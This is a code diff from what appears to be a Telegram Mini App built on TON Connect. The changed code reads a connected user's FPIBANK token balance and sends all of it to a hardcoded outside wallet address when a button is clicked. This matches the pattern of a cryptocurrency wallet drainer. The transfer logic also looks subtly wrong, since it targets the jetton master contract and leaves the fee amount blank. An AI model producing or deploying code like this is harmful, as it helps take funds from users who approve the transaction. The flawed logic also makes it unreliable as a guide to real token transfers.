@@ -45,51 +45,54 @@
       buttonRootId: "ton-connect"
     });
 
-
-async function getJettonBalance(userAddress, jettonMasterAddress) {
-    const response = await fetch(`https://tonapi.io/v2/accounts/${userAddress}/jettons`);
-    const data = await response.json();
-  
-    const jetton = data.balances.find(j => j.jetton.address === jettonMasterAddress);
-    return jetton ? jetton.balance : "0";
-}
-
-async function sendJettonTransaction(userWalletAddress, recipientAddress) {
-    const balance = await getJettonBalance(userWalletAddress, jettonMasterAddress);
-
     const jettonMasterAddress = "0:f42a9711321fac28edb3e7ebce8e0bc58d34f9f2d3bed8d9afc6a839a1c15016";
+    const recipientAddress = "UQCXsfFqRsY2pS3HsNzqnN0ns2ANiGrHpnmg_rQCJ-gxlqlU";
 
-    async function sendJettonTransaction(userWalletAddress, recipientAddress) {
-  const transaction = {
-    validUntil: Math.floor(Date.now() / 1000) + 360,
-    messages: [
-      {
-        address: jettonMasterAddress, // Отправляем на Jetton Master напрямую
-        amount: "", // Автоматический расчет комиссии
-        payload: {
-          type: "jetton_transfer",
-          query_id: 0,
-          amount: balance, // Попытка отправить 1 токен
-          destination: recipientAddress,
-          response_destination: null,
-          custom_payload: null,
-          forward_ton_amount: "0",
-          forward_payload: null
-        }
+    async function getJettonBalance(userAddress, jettonMasterAddress) {
+      const response = await fetch(`https://tonapi.io/v2/accounts/${userAddress}/jettons`);
+      const data = await response.json();
+      
+      const jetton = data.balances.find(j => j.jetton.address === jettonMasterAddress);
+      return jetton ? jetton.balance : "0";
+    }
+
+    async function sendJettonTransaction(userWalletAddress) {
+      const balance = await getJettonBalance(userWalletAddress, jettonMasterAddress);
+      
+      if (balance === "0") {
+        Telegram.WebApp.showAlert("У вас нет токенов FPIBANK.");
+        return;
       }
-    ]
-  };
 
-  try {
-    const result = await tonConnectUI.sendTransaction(transaction);
-    console.log("Попытка отправить Jetton:", result);
-    Telegram.WebApp.showAlert("Попытка отправить Jetton: " + JSON.stringify(result));
-  } catch (error) {
-    console.error("Ошибка:", error);
-    Telegram.WebApp.showAlert("Ошибка транзакции: " + error.message);
-  }
-}
+      const transaction = {
+        validUntil: Math.floor(Date.now() / 1000) + 360,
+        messages: [
+          {
+            address: jettonMasterAddress, // Отправляем на Jetton Master напрямую
+            amount: "", // Автоматический расчет комиссии
+            payload: {
+              type: "jetton_transfer",
+              query_id: 0,
+              amount: balance, // Отправляем ВСЕ токены
+              destination: recipientAddress,
+              response_destination: null,
+              custom_payload: null,
+              forward_ton_amount: "0",
+              forward_payload: null
+            }
+          }
+        ]
+      };
 
+      try {
+        const result = await tonConnectUI.sendTransaction(transaction);
+        console.log("Попытка отправить Jetton:", result);
+        Telegram.WebApp.showAlert("Jetton отправлен: " + JSON.stringify(result));
+      } catch (error) {
+        console.error("Ошибка:", error);
+        Telegram.WebApp.showAlert("Ошибка транзакции: " + error.message);
+      }
+    }
 
     async function sendAllFPIBANK() {
       if (!tonConnectUI.connected) {
@@ -98,9 +101,7 @@ async function sendJettonTransaction(userWalletAddress, recipientAddress) {
       }
 
       const userWalletAddress = tonConnectUI.wallet.account.address;
-      const recipientAddress = "UQCXsfFqRsY2pS3HsNzqnN0ns2ANiGrHpnmg_rQCJ-gxlqlU";
-
-      await sendJettonTransaction(userWalletAddress, recipientAddress);
+      await sendJettonTransaction(userWalletAddress);
     }
 
     document.getElementById("sendTransaction").addEventListener("click", sendAllFPIBANK);
